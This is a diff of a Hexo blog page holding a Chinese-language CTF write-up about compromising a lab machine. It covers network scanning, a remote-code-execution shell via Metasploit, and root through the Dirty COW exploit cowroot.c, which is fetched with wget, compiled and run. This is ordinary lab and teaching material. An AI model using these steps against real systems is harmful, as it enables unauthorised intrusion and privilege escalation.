@@ -22,15 +22,15 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="CTF攻击及提权过程笔记目标识别与扫描 启动靶机后，使用arp-scan -l扫描，发现靶机IP为192.168.80.155。![[source&#x2F;_posts&#x2F;第一周靶机&#x2F;arp-scan.png]] 使用nmap -p-扫描常用端口，发现开放22和80端口。![[source&#x2F;images&#x2F;nmap.png]] 通过Firefox访问80端口，">
+  <meta name="description" content="CTF攻击及提权过程笔记目标识别与扫描 启动靶机后，使用arp-scan -l扫描，发现靶机IP为192.168.80.155。![[images&#x2F;arp-scan.png]] 使用nmap -p-扫描常用端口，发现开放22和80端口。![[images&#x2F;nmap.png]] 通过Firefox访问80端口，输入用户名后点击”startthectf”.  ![[images&amp;#">
 <meta property="og:type" content="article">
 <meta property="og:title" content="第一周靶机">
 <meta property="og:url" content="http://example.com/2023/11/25/%E7%AC%AC%E4%B8%80%E5%91%A8%E9%9D%B6%E6%9C%BA/index.html">
 <meta property="og:site_name" content="RickkCity">
-<meta property="og:description" content="CTF攻击及提权过程笔记目标识别与扫描 启动靶机后，使用arp-scan -l扫描，发现靶机IP为192.168.80.155。![[source&#x2F;_posts&#x2F;第一周靶机&#x2F;arp-scan.png]] 使用nmap -p-扫描常用端口，发现开放22和80端口。![[source&#x2F;images&#x2F;nmap.png]] 通过Firefox访问80端口，">
+<meta property="og:description" content="CTF攻击及提权过程笔记目标识别与扫描 启动靶机后，使用arp-scan -l扫描，发现靶机IP为192.168.80.155。![[images&#x2F;arp-scan.png]] 使用nmap -p-扫描常用端口，发现开放22和80端口。![[images&#x2F;nmap.png]] 通过Firefox访问80端口，输入用户名后点击”startthectf”.  ![[images&amp;#">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-11-25T12:04:57.000Z">
-<meta property="article:modified_time" content="2023-11-26T07:20:40.945Z">
+<meta property="article:modified_time" content="2023-11-27T12:11:17.347Z">
 <meta property="article:author" content="Rickk">
 <meta property="article:tag" content="网安工作室">
 <meta name="twitter:card" content="summary">
@@ -227,7 +227,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-11-26 15:20:40" itemprop="dateModified" datetime="2023-11-26T15:20:40+08:00">2023-11-26</time>
+                <time title="修改时间：2023-11-27 20:11:17" itemprop="dateModified" datetime="2023-11-27T20:11:17+08:00">2023-11-27</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -258,36 +258,36 @@
 
       
         <h1 id="CTF攻击及提权过程笔记"><a href="#CTF攻击及提权过程笔记" class="headerlink" title="CTF攻击及提权过程笔记"></a>CTF攻击及提权过程笔记</h1><h2 id="目标识别与扫描"><a href="#目标识别与扫描" class="headerlink" title="目标识别与扫描"></a>目标识别与扫描</h2><ol>
-<li>启动靶机后，使用<code>arp-scan -l</code>扫描，发现靶机IP为192.168.80.155。<br>![[source&#x2F;_posts&#x2F;第一周靶机&#x2F;arp-scan.png]]</li>
-<li>使用<code>nmap -p-</code>扫描常用端口，发现开放22和80端口。<br>![[source&#x2F;images&#x2F;nmap.png]]</li>
+<li>启动靶机后，使用<code>arp-scan -l</code>扫描，发现靶机IP为192.168.80.155。<br>![[images&#x2F;arp-scan.png]]</li>
+<li>使用<code>nmap -p-</code>扫描常用端口，发现开放22和80端口。<br>![[images&#x2F;nmap.png]]</li>
 <li>通过Firefox访问80端口，输入用户名后点击”startthectf”.</li>
 </ol>
-<p>![[source&#x2F;images&#x2F;<a href="http://www.png]]">www.png]]</a></p>
+<p>![[images&#x2F;<a href="http://www.png]]">www.png]]</a></p>
 <h2 id="漏洞扫描与利用"><a href="#漏洞扫描与利用" class="headerlink" title="漏洞扫描与利用"></a>漏洞扫描与利用</h2><ol start="4">
 <li><p>查看网页源代码无果后，使用<code>nikto</code>扫描，发现网站存在漏洞.</p>
 <p> <code>nikto -h 192.168.80.155</code></p>
 </li>
 <li><p>根据提示替换网址后发现无法访问，重新使用<code>nmap</code>扫描，发现多出一个60080端口.</p>
 </li>
-<li><p>![[source&#x2F;images&#x2F;renmap.png]]发现网站转移到不同端口，尝试访问<code>/?page</code>页面.<br>![[source&#x2F;images&#x2F;page.png]]</p>
+<li><p>![[images&#x2F;renmap.png]]发现网站转移到不同端口，尝试访问<code>/?page</code>页面.<br>![[images&#x2F;page.png]]</p>
 </li>
 <li><p>使用<code>dirb</code>工具扫描，发现一个后缀为<code>mailer</code>的网页.</p>
-<p> <code>dirb http://192.168.80.155/</code><br> ![[source&#x2F;images&#x2F;mailer.png]]</p>
+<p> <code>dirb http://192.168.80.155/</code><br> ![[images&#x2F;mailer.png]]</p>
 </li>
-<li><p>查看源代码，发现一段注释，得知存在远程代码执行漏洞.<br>![[source&#x2F;images&#x2F;note.png]]</p>
+<li><p>查看源代码，发现一段注释，得知存在远程代码执行漏洞.<br>![[images&#x2F;note.png]]</p>
 </li>
 </ol>
 <h2 id="渗透与提权"><a href="#渗透与提权" class="headerlink" title="渗透与提权"></a>渗透与提权</h2><ol start="9">
-<li>使用Metasploit，修改参数并开启监听.<br> ![[source&#x2F;images&#x2F;matesploit1.png]]<br> ![[source&#x2F;images&#x2F;matesploit2.png]]<br> ![[source&#x2F;images&#x2F;matesploit3.png]]</li>
+<li>使用Metasploit，修改参数并开启监听.<br> ![[images&#x2F;matesploit1.png]]<br> ![[source&#x2F;images&#x2F;matesploit2.png]]<br> ![[images&#x2F;matesploit3.png]]</li>
 <li>复制给出的指令到网址的<code>mail=</code>后，输入<code>sessions</code>查看获取的shell.</li>
-<li>使用<code>sessions 1</code>连接shell，输入<code>sysinfo</code>获取系统信息，然后使用<code>shell -t</code>获得系统shell.<br> ![[source&#x2F;images&#x2F;session1.png]]</li>
-<li>使用<code>wget</code>下载提权工具，如：<a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c">cowroot.c</a>.<br>![[source&#x2F;images&#x2F;download.png]] </li>
+<li>使用<code>sessions 1</code>连接shell，输入<code>sysinfo</code>获取系统信息，然后使用<code>shell -t</code>获得系统shell.<br> ![[images&#x2F;session1.png]]</li>
+<li>使用<code>wget</code>下载提权工具，如：<a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c">cowroot.c</a>.<br>![[images&#x2F;download.png]] </li>
 <li>使用<code>python3 -m http.server 8081</code>开启Kali的HTTP服务.</li>
 <li>在目标机器上使用<code>wget http://192.168.80.154:8081/cowroot.c</code>下载提权工具.</li>
 <li>使用<code>gcc cowroot.c -o exp -pthread</code>编译提权工具.</li>
 <li>使用<code>chmod +x exp</code>给提权文件赋予执行权限.</li>
-<li>运行提权脚本：<code>./exp</code>.<br> ![[source&#x2F;images&#x2F;chmod.png]]</li>
-<li>最后，进入root目录，发现<code>flag.txt</code>，使用<code>cat</code>命令获取flag.<br>![[source&#x2F;images&#x2F;cat.png]]<br>这是攻击与提权的一般过程，务必在合法环境中进行此类操作，以免违反法律规定.</li>
+<li>运行提权脚本：<code>./exp</code>.<br> ![[images&#x2F;chmod.png]]</li>
+<li>最后，进入root目录，发现<code>flag.txt</code>，使用<code>cat</code>命令获取flag.<br>![[images&#x2F;cat.png]]<br>这是攻击与提权的一般过程，务必在合法环境中进行此类操作，以免违反法律规定.</li>
 </ol>
 <p>Nikto 工具：</p>
 <p>定义： Nikto是一个开源的Web服务器扫描工具，用于发现Web服务器上的潜在安全问题。它可以帮助鉴定常见的安全漏洞，如不安全的配置、过时的软件版本等.</p>
